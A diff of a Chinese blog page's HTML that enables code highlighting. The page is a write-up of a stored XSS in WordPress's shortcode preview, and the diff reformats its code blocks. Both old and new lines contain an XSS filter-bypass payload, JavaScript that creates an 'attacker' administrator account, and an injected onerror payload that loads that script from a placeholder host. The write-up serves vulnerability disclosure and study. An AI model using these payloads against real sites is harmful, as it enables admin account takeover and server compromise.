@@ -22,7 +22,7 @@ gtag('config', 'UA-177549855-1');
   localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -159,7 +159,8 @@ if (autoChangeMode === '1') {
 <p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20190920141349-cf90eed6-db6d-1.png"></p>
 <p>图2.Shortcode错误消息预览</p>
 <p>使用PoC代码</p>
-<pre><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=alert(&quot;熊本熊本熊&quot;)&amp;gt;</code></pre>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(&quot;熊本熊本熊&quot;)<span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>可以轻松绕过此预览中的XSS过滤器。 </p>
 <p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20190920141406-d99b9ad4-db6d-1.png"></p>
 <p>图3.将PoC代码插入Shortcode块</p>
@@ -168,23 +169,11 @@ if (autoChangeMode === '1') {
 <p>图4. WordPress短代码预览XSS</p>
 <p>如果受害者恰好拥有管理员权限，攻击者即可以利用此漏洞获取管理员帐户的控制权，利用WordPress内置函数 getShell，然后控制服务器。</p>
 <p>例如，攻击者可以在其Web服务器上托管JavaScript文件，例如[wpaddadmin <a target="_blank" rel="noopener" href="https://g0blin.co.uk/xss-and-wordpress-the-aftermath/">。] js</a>（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“attacker”，密码为“attacker”。</p>
-<pre><code class="javascript">// Send a GET request to the URL &#39;/wordpress/wp-admin/user-new.php&#39;, and extract the current &#39;nonce&#39; value  
-var ajaxRequest = new XMLHttpRequest();  
-var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  
-var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  
-ajaxRequest.open(&quot;GET&quot;, requestURL, false);  
-ajaxRequest.send();  
-var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  
-var nonce = nonceMatch[1];  
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Send a GET request to the URL &#x27;/wordpress/wp-admin/user-new.php&#x27;, and extract the current &#x27;nonce&#x27; value  </span></span><br><span class="line"><span class="keyword">var</span> ajaxRequest = <span class="keyword">new</span> XMLHttpRequest();  </span><br><span class="line"><span class="keyword">var</span> requestURL = <span class="string">&quot;/wordpress/wp-admin/user-new.php&quot;</span>;  </span><br><span class="line"><span class="keyword">var</span> nonceRegex = <span class="regexp">/ser&quot; value=&quot;([^&quot;]*?)&quot;/g</span>;  </span><br><span class="line">ajaxRequest.open(<span class="string">&quot;GET&quot;</span>, requestURL, <span class="literal">false</span>);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line"><span class="keyword">var</span> nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line"><span class="keyword">var</span> nonce = nonceMatch[<span class="number">1</span>];  </span><br><span class="line"></span><br><span class="line"><span class="comment">// Construct a POST query, using the previously extracted &#x27;nonce&#x27; value, and create a new user with an arbitrary username / password, as an Administrator  </span></span><br><span class="line"><span class="keyword">var</span> params = <span class="string">&quot;action=createuser&amp;_wpnonce_create-user=&quot;</span>+nonce+<span class="string">&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;</span>;  </span><br><span class="line">ajaxRequest = <span class="keyword">new</span> XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(<span class="string">&quot;POST&quot;</span>, requestURL, <span class="literal">true</span>);  </span><br><span class="line">ajaxRequest.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure>
 
-// Construct a POST query, using the previously extracted &#39;nonce&#39; value, and create a new user with an arbitrary username / password, as an Administrator  
-var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  
-ajaxRequest = new XMLHttpRequest();  
-ajaxRequest.open(&quot;POST&quot;, requestURL, true);  
-ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  
-ajaxRequest.send(params);</code></pre>
 <p>然后，攻击者可以在JavaScript中注入以下PoC代码。</p>
-<pre><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () &#123; var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) &#123; var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);&#125;&#125;)();&quot;&amp;gt;</code></pre>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;</span>javascript&amp;colon;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">var</span> <span class="built_in">url</span> = <span class="string">&#x27;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#x27;</span>;<span class="keyword">if</span> (<span class="keyword">typeof</span> beef == <span class="string">&#x27;undefined&#x27;</span>) &#123; <span class="keyword">var</span> bf = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>); bf.type = <span class="string">&#x27;text/javascript&#x27;</span>; bf.src = <span class="built_in">url</span>; <span class="built_in">document</span>.body.appendChild(bf);&#125;&#125;)();<span class="string">&quot;&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20190920141432-e97fa756-db6d-1.png"></p>
 <p>图5.注入XSS代码以添加管理员帐户</p>
 <p>一旦具有高权限的受害者查看此帖，就会立即创建attacker管理员帐户。 </p>
